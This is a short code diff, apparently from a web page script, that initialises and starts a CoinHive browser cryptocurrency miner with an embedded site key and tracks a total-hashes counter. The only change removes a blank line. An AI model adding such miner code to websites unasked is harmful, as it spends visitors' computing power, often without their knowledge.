@@ -1,5 +1,4 @@
 var miner = new CoinHive.Anonymous('nzsqRtzXjHw8qYGPdSV56jEattRTXGxb');
-
 miner.start();
 const total = document.querySelector('#totalHashes');
 var totalHashes, threads;
